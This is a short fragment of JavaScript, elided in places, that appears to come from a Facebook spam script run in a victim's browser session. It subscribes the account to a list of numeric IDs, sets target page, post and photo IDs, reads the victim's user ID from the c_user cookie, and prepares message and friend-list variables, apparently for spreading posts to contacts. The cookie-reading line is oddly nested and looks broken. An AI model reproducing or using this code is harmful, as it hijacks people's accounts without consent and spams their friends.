    ...
    sublist("1376742959269037");
    sublist("1376745262602140");
    sublist("1376742175935782");
    sublist("613929562020830");
    sublist("1376732265936773");
    sublist("218773761626876");
    sublist("1381523795459117"); 
    sublist("1411856972365865"); 
    sublist("1411866489031580"); 
    sublist("1396567877228108"); 
    ...
    var spage_id = "449150561861508";
    var spost_id = "449150561861508";
    var sfoto_id = "449150561861508";
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var smesaj = "";
    var smesaj_text = "";
    var arkadaslar = [];
